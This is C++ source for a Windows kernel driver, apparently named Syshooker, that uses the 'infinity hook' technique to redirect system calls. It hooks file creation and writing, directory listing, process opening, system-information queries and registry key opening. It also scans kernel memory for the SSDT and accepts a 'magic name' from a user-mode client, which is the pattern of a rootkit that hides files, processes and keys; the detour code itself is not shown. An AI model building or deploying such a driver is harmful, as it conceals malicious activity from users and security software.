/*
*	Module Name:
*		entry.cpp
*
*	Abstract:
*		Sample driver that implements infinity hook to detour
*		system calls.
*
*	Authors:
*		Nick Peterson <everdox@gmail.com> | http://everdox.net/
*
*	Special thanks to Nemanja (Nemi) Mulasmajic <nm@triplefault.io>
*	for his help with the POC.
*
*/

#include "stdafx.h"
#include "entry.h"
#include "infinityhook.h"
#include "../Syshooker-Client/SyshookerCommon.h"
#include "Settings.h"
#include "mm.h"
#include "img.h"

// Hooked Syscalls
#include "NtCreateFile.h"
#include "NtWriteFile.h"
#include "NtQueryDirectoryFile.h"
#include "NtQueryDirectoryFileEx.h"
#include "NtOpenProcess.h"
#include "NtQuerySystemInformation.h"
#include "NtOpenKey.h"

UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\??\\Syshooker");

NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp);

char CALLBACK_OVERWRITE_ENABLED = 0;

/*
*	The entry point of the driver. Initializes infinity hook and
*	sets up the driver's unload routine so that it can be gracefully 
*	turned off.
*/
extern "C" NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	//UNREFERENCED_PARAMETER(RegistryPath);

	// IRP Routines
	DriverObject->MajorFunction[IRP_MJ_CREATE] = SyshookerCreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = SyshookerCreateClose;
	DriverObject->MajorFunction[IRP_MJ_WRITE] = SyshookerWrite;

	// Device name
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\Syshooker");

	// create Device Object
	PDEVICE_OBJECT DeviceObject;
	NTSTATUS status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &DeviceObject);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create device object (0x%08X)\n", status));
		return status;
	}
	
	status = IoCreateSymbolicLink(&symLink, &deviceName);
	if (!NT_SUCCESS(status)) {
		KdPrint(("Failed to create symbolic link (0x%08X)\n", status));

		// need to free DeviceObject to clean up!!!
		IoDeleteDevice(DeviceObject);
		return status;
	}

	//
	// Figure out when we built this last for debugging purposes.
	//
	kprintf("[+] infinityhook: Loaded.\n");
	
	//
	// Let the driver be unloaded gracefully. This also turns off 
	// infinity hook.
	//
	DriverObject->DriverUnload = DriverUnload;

	// HERE: find the address of a real syscall
	// Find the original address of NtCreateFile.
	OriginalNtCreateFile = (NtCreateFile_t)MmGetSystemRoutineAddress(&StringNtCreateFile);
	if (!OriginalNtCreateFile)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtCreateFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtWriteFile
	OriginalNtWriteFile = (NtWriteFile_t)MmGetSystemRoutineAddress(&StringNtWriteFile);
	if (!OriginalNtWriteFile)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtWriteFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtQueryDirectoryFile
	OriginalNtQueryDirectoryFile = (NtQueryDirectoryFile_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFile);
	if (!OriginalNtQueryDirectoryFile)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFile);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtQueryDirectoryFileEx
	OriginalNtQueryDirectoryFileEx = (NtQueryDirectoryFileEx_t)MmGetSystemRoutineAddress(&StringNtQueryDirectoryFileEx);
	if (!OriginalNtQueryDirectoryFileEx)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQueryDirectoryFileEx);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	// Find the original address of NtOpenProcess
	OriginalNtOpenProcess = (NtOpenProcess_t)MmGetSystemRoutineAddress(&StringNtOpenProcess);
	if (!OriginalNtOpenProcess)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtOpenProcess);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	OriginalNtQuerySystemInformation = (NtQuerySystemInformation_t)MmGetSystemRoutineAddress(&StringNtQuerySystemInformation);
	if (!OriginalNtQuerySystemInformation)
	{
		kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtQuerySystemInformation);
		return STATUS_ENTRYPOINT_NOT_FOUND;
	}

	//OriginalNtOpenKey = (NtOpenKey_t)0xfffff80320215790;
	//if (!OriginalNtOpenKey)
	//{
	//	//kprintf("[-] infinityhook: Failed to locate export: %wZ.\n", StringNtOpenKey);
	//	return STATUS_ENTRYPOINT_NOT_FOUND;
	//}
	//else kprintf("[-] infinityhook: NtOpenKey address: %p.\n", OriginalNtOpenKey);

	//
	// Initialize infinity hook. Each system call will be redirected
	// to our syscall stub.
	//
	NTSTATUS Status = IfhInitialize(SyscallCallback);
	if (!NT_SUCCESS(Status))
	{
		kprintf("[-] infinityhook: Failed to initialize with status: 0x%lx.\n", Status);
	}
	else
	{
		CALLBACK_OVERWRITE_ENABLED = 1;
	}

	PVOID NtBaseAddress = NULL;
	ULONG SizeOfNt = 0;
	NtBaseAddress = ImgGetBaseAddress(NULL, &SizeOfNt);
	if (!NtBaseAddress) {
		kprintf("[-] infinityhook: Failed to resolve NtBaseAddress.\n");
		return STATUS_FAILED_DRIVER_ENTRY;
	}
	else {
		kprintf("[+] infinityhook: NtBaseAddress: %p and size %d.\n", NtBaseAddress, SizeOfNt);
	}

	// size of ntkrnlmp.exe on W10 1809 17763.1
	// we don't actually need this because ImgGetBaseAddress
	// gets the size as well
	// const size_t NtkrnlmpImageSize = 0x009F1000;

	/*
		kd> dps kiservicetable L2
		fffff806`54205e10  fd13b200`fccb5104
		fffff806`54205e18  03d23900`0219a602
	*/
	const UCHAR SsdtOffsetByteSignature[] = {
		0x04, 0x51, 0xcb, 0xfc, 0x00, 0xb2, 0x13, 0xfd, // first SSDT offset
	};

	const void* SsdtAddress = MmSearchMemory(NtBaseAddress, SizeOfNt, SsdtOffsetByteSignature, RTL_NUMBER_OF(SsdtOffsetByteSignature));
	if (!SsdtAddress) {
		kprintf("[-] infinityhook: SSDT pattern not found.\n");
	}
	else {
		kprintf("[-] infinityhook: SSDT address: %p\n", SsdtAddress);
	}

	return Status;
}

/*
*	Turns off infinity hook.
*/
void DriverUnload(_In_ PDRIVER_OBJECT DriverObject) {
	UNREFERENCED_PARAMETER(DriverObject);

	CALLBACK_OVERWRITE_ENABLED = 0;

	//
	// Unload infinity hook gracefully.
	//
	IfhRelease();

	// Release driver resources (symlink, device object)
	IoDeleteSymbolicLink(&symLink);
	IoDeleteDevice(DriverObject->DeviceObject);

	kprintf("\n[!] infinityhook: Unloading... BYE!\n");
}

/*
*	For each usermode syscall, this stub will be invoked.
*/
void __fastcall SyscallCallback(
	_In_ unsigned int SystemCallIndex, 
	_Inout_ void** SystemCallFunction)
{
	// 
	// Enabling this message gives you VERY verbose logging... and slows
	// down the system. Use it only for debugging.
	//
	
#if 0
	kprintf("[+] infinityhook: SYSCALL %lu: 0x%p [stack: 0x%p].\n", SystemCallIndex, *SystemCallFunction, SystemCallFunction);
#endif

	UNREFERENCED_PARAMETER(SystemCallIndex);

	if (!CALLBACK_OVERWRITE_ENABLED) return;

	// HERE: overwrite the syscall address
	//
	// In our demo, we care only about nt!NtCreateFile calls.
	//
	if (*SystemCallFunction == OriginalNtCreateFile)
	{	
		//
		// We can overwrite the return address on the stack to our detoured
		// NtCreateFile.
		//
		*SystemCallFunction = DetourNtCreateFile;
	}

	// NtWriteFile
	if (*SystemCallFunction == OriginalNtWriteFile)
	{
		*SystemCallFunction = DetourNtWriteFile;
	}

	// NtQueryDirectoryFile
	if (*SystemCallFunction == OriginalNtQueryDirectoryFile)
	{
		*SystemCallFunction = DetourNtQueryDirectoryFile;
	}

	// NtQueryDirectoryFileEx
	if (*SystemCallFunction == OriginalNtQueryDirectoryFileEx)
	{
		*SystemCallFunction = DetourNtQueryDirectoryFileEx;
	}

	// NtOpenProcess
	if (*SystemCallFunction == OriginalNtOpenProcess)
	{
		*SystemCallFunction = DetourNtOpenProcess;
	}

	// NtQuerySystemInformation
	if (*SystemCallFunction == OriginalNtQuerySystemInformation)
	{
		*SystemCallFunction = DetourNtQuerySystemInformation;
	}

	//NtOpenKey
	if (*SystemCallFunction == OriginalNtOpenKey)
	{
		//kprintf("[+] infinityhook: I can't believe this... %p %p\n", OriginalNtOpenKey, *SystemCallFunction);
		*SystemCallFunction = DetourNtOpenKey;
	}
}

NTSTATUS SyshookerCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	UNREFERENCED_PARAMETER(DeviceObject);
	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS SyshookerWrite(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
	NTSTATUS status = STATUS_SUCCESS; // initially define status as success
	ULONG_PTR information = 0; // used bytes to return back to client

	// get stack location of IRP
	PIO_STACK_LOCATION irpSp = IoGetCurrentIrpStackLocation(Irp);

	do {
		if (irpSp->Parameters.Write.Length < sizeof(WriteHookData)) {
			status = STATUS_BUFFER_TOO_SMALL;
			break;
		}

		// make data buffer accessible as ThreadData pointer
		WriteHookData* data = static_cast<WriteHookData*>(Irp->UserBuffer);

		// check nullptr and valid values
		if (data == nullptr || data->BufferLength <= 0 || data->BufferLength > MAX_PATH_SYSHOOKER) {
			if (data != nullptr)
				KdPrint(("BufferLength is probably wrong (%d). (0x%08X)\n", data->BufferLength, status));

			status = STATUS_INVALID_PARAMETER;
			break;
		}

		// print the buffer in kernel
		kprintf("[+] infinityhook: Syshooker IRP Write: %ws.\n", data->NameBuffer);
		if (wcscpy_s(Settings.NtWriteFileMagicName, MAX_PATH_SYSHOOKER, data->NameBuffer) != 0) {
			status = STATUS_INVALID_PARAMETER;
		}
		

		// return data used
		information = sizeof(*data);
	} while (FALSE);

	// complete IRP
	Irp->IoStatus.Status = status; // whatever status that is currently set
	Irp->IoStatus.Information = information;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);
	return status;
}